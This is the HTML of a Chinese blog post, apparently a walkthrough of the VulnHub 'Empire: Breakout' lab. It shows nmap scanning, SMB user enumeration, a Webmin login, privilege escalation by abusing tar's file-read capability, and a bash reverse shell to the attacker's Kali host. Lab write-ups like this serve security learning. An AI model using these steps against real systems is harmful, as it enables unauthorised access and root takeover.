@@ -1,0 +1,835 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-C" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/nn.png">
+  <link rel="icon" href="/img/nn.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Breakout第一步知道自己的ip，kali打开终端输入 1ifconfig   知道了我们的ip为192.168.223.128 用nmap工具，因为靶场和kali都在自己电脑的vmware里，所以这俩在一个网段 因此扫描自己ip的网段 1nmao -sP 192.168.223.128&#x2F;24  128是本机，按照经验我们先测试133这个ip，使用nmap扫描端口 1nmap -p 1-400">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-Breakout">
+<meta property="og:url" content="http://example.com/2022/10/11/Breakout/index.html">
+<meta property="og:site_name" content="gugugux">
+<meta property="og:description" content="Breakout第一步知道自己的ip，kali打开终端输入 1ifconfig   知道了我们的ip为192.168.223.128 用nmap工具，因为靶场和kali都在自己电脑的vmware里，所以这俩在一个网段 因此扫描自己ip的网段 1nmao -sP 192.168.223.128&#x2F;24  128是本机，按照经验我们先测试133这个ip，使用nmap扫描端口 1nmap -p 1-400">
+<meta property="og:locale">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8fb5b66933f0400c8442e8d2b7cf69d0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fdf16dbd2920480cad5b67674b0b5128.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/045e72a3b379488eb5dd25203102d396.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f73616ac612b449fbe6d047215de234d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/92d34f6fdffa45ac95828392c731b429.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9290fbaa6c6f4793b70b3e59f3cf3905.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/597e1615d6134efda3ecbc3a9ac129df.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/90328801daae4810bb0e926ae1843cc4.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/23db0054938d482c94c554643587f855.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9ca6e208fce8450db86868bc44024fd6.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e5c737ab6e534c9d80a89cc2c16d1717.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/36c6bae58c2d4233a7995d8c7ea34af2.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/081dc4f25c8e4c1aa71d785ec73612f7.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8265f7e16f0d4ffc99a0bc915b1782b1.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4ee6ca5f7f994d14b5a917502531aeb9.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/986e153ceaf0442596ee555d9befa4f9.png#pic_center">
+<meta property="article:published_time" content="2022-10-11T07:29:25.000Z">
+<meta property="article:modified_time" content="2022-10-11T11:07:04.472Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透学习">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/8fb5b66933f0400c8442e8d2b7cf69d0.png">
+  
+  
+  
+  <title>vulnhub-Breakout - gugugux</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEGCXGAa5RG18TvrREJ4E3qM-gzGzoHsz","app_key":"1oISyjS4rilEb9bBzpBVzCpX","server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Gux</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub-Breakout"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-11 15:29" pubdate>
+          October 11, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">vulnhub-Breakout</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h2><p>第一步知道自己的ip，kali打开终端输入</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/8fb5b66933f0400c8442e8d2b7cf69d0.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>知道了我们的ip为192.168.223.128</p>
+<p>用nmap工具，因为靶场和kali都在自己电脑的vmware里，所以这俩在一个网段</p>
+<p>因此扫描自己ip的网段</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmao</span> -sP <span class="hljs-number">192.168.223.128</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/fdf16dbd2920480cad5b67674b0b5128.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>128是本机，按照经验我们先测试133这个ip，使用nmap扫描端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">40000</span> <span class="hljs-number">192.168.233.133</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/045e72a3b379488eb5dd25203102d396.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>发现开放了5个端口，可以判定这个就是我们的Breakout靶场了</p>
+<p>继续利用nmap扫描，观察是否存在漏洞</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> --script=vuln <span class="hljs-number">192.168.223.133</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/f73616ac612b449fbe6d047215de234d.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>发现10000端口存在cve-2006-339漏洞</p>
+<p>但是网络上没有相关的复现，也没有poc无法验证</p>
+<p>所以先去80端口看看http服务</p>
+<p>浏览器上输入靶场ip即192.168.233.133访问页面</p>
+<p><img src="https://img-blog.csdnimg.cn/92d34f6fdffa45ac95828392c731b429.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>右键按V查看源码可以看到提示</p>
+<p><img src="https://img-blog.csdnimg.cn/9290fbaa6c6f4793b70b3e59f3cf3905.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这是一个Brainfuck的编码</p>
+<p>网上搜索Brainfuck<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">在线解密</a>（这里给你们找了一个网站）然后把504这段字符串放进去解密点击Brainfuck to Text解密得到解密文本</p>
+<p><img src="https://img-blog.csdnimg.cn/597e1615d6134efda3ecbc3a9ac129df.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">这个字符串大概率是密码<br>.<span class="hljs-number">2</span>uqPEfj3D&lt;P<span class="hljs-symbol">&#x27;a</span>-<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>再查看其他页面</p>
+<p>访问139和445端口时无法访问，但是访问10000和20000端口时返回了页面</p>
+<p><img src="https://img-blog.csdnimg.cn/90328801daae4810bb0e926ae1843cc4.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>密码我们获取了，我们得想办法获取用户名，</p>
+<p>之前nmap扫描发现存在smb服务</p>
+<p>这里我们可以使用enum4linux工具枚举用户名</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">enum4linux</span> -r <span class="hljs-number">192.168.223.133</span><br></code></pre></td></tr></table></figure>
+
+<p>发现了一个cyber的用户</p>
+<p>尝试去登录，发现在端口为20000的网页上能登录，并且找到了shell界面（密码为.2uqPEfj3D&lt;P’a-3）</p>
+<p><img src="https://img-blog.csdnimg.cn/23db0054938d482c94c554643587f855.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/9ca6e208fce8450db86868bc44024fd6.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>进入shell界面第一步就是先ls查看文件</p>
+<p>发现了user.txt文件，敏感的我们打开他便发现了第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/e5c737ab6e534c9d80a89cc2c16d1717.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>接下来我们需要提权，首先想到的是suid提权，输入下面的命令，看看有没有可以提权的执行文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p>遗憾的是并没有可以提权的可执行文件，具体哪些文件可以提权参考这个地址[linux利用SUID提权](<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1600994">Linux下利用SUID提权 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>)，原理是通过某些特定文件的s权限提权，s权限可以让文件在执行过程中保持root权限，执行结束后恢复普通用户权限，利用这一特性可以提权</p>
+<p><img src="https://img-blog.csdnimg.cn/36c6bae58c2d4233a7995d8c7ea34af2.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这时想到了当时ls发现下面还有也给tar文件</p>
+<p>网上查询资料知道tar也可以用来提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">getcap</span> tar<br></code></pre></td></tr></table></figure>
+
+<p>发现有 cap_dac_read_search&#x3D;ep 功能，能读取文件。在 &#x2F;var&#x2F;backups 目录下发现了一个密码备份文件：</p>
+<p>即.old_pass.bak，但是只是只允许管理员来读取</p>
+<p><img src="https://img-blog.csdnimg.cn/081dc4f25c8e4c1aa71d785ec73612f7.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>上面tar可以读取任意文件，利用这一特性我们可以吧这个文件先压缩，在解压，这样这个文件的创建者用户就从root变成了我们</p>
+<p>现在我们得回到之前的cyber的目录，因为那个目录才有tar命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/cyber<br>./tar -cvf pass.tar /var/backups/.old_pass.bak<br>tar -xvf pass.tar<br><span class="hljs-built_in">cat</span> var/backups/.old_pass.bak<br></code></pre></td></tr></table></figure>
+
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-BVhuQZze-1665478661190)(<img src="https://img-blog.csdnimg.cn/8265f7e16f0d4ffc99a0bc915b1782b1.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>)]</p>
+<p>于是得到了root的密码</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">Ts<span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;</span>YurgtRX(=~h<br></code></pre></td></tr></table></figure>
+
+
+
+<p>我们使用su命令发现不能直接使用 这个命令(原因我也没看明白，原文没说)</p>
+<p>所以我们使用反弹shell的方式，可以在我们kali的机器上连接靶机的shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">先在kali上输入<br>nc -lvvp <span class="hljs-number">7777</span><br>再在网页上输入<br>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/192.168.223.128/</span><span class="hljs-number">7777</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/4ee6ca5f7f994d14b5a917502531aeb9.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看到kali上已经连接上了，用户前面已经是cyber@breakout</p>
+<p>现在就可以执行su命令</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">su<br>Ts<span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;</span>YurgtRX(=~h<br>id<br></code></pre></td></tr></table></figure>
+
+<p>可以看到已经是root权限了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
+
+<p>看到rOOt.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> rOOt.txt<br></code></pre></td></tr></table></figure>
+
+<p>得到最终的flag</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-1rWHjx7Q-1665478661192)(<img src="https://img-blog.csdnimg.cn/986e153ceaf0442596ee555d9befa4f9.png#pic_center" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>)]</p>
+<p>参考文献</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/C0ngvv/p/15605368.html">Vulnhub-Empire: Breakout题解 - C0ngvv - 博客园 </a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15682132.html#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园</a></p>
+<p>参考文献</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/C0ngvv/p/15605368.html">Vulnhub-Empire: Breakout题解 - C0ngvv - 博客园 </a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15682132.html#%E4%BA%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43006864/article/details/124527913">vulnhub-EMPIRE: BREAKOUT_大西瓜的安全之路的博客-CSDN博客</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" class="print-no-link">#渗透学习</a>
+      
+        <a href="/tags/vulnhub/" class="print-no-link">#vulnhub</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub-Breakout</div>
+      <div>http://example.com/2022/10/11/Breakout/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 11, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/12/20/%E4%B8%8D%E5%90%8C%E6%96%B9%E5%BC%8F%E5%86%99%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" title="除了文件上传还有哪些方式可以写一句话木马？">
+                        <span class="hidden-mobile">除了文件上传还有哪些方式可以写一句话木马？</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"yfX309unlxuO2JkbvRx1AvEc-gzGzoHsz","appKey":"XevHGsBB9S3de95ggmhi431g","path":"window.location.pathname","placeholder":"吐槽","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://wegcxgaa.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+          欢迎来到我的博客
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="" target="_blank" rel="nofollow noopener"><span>gx</span></a> <i class="iconfont icon-love"></i> <a href="" target="_blank" rel="nofollow noopener"><span>lyq</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
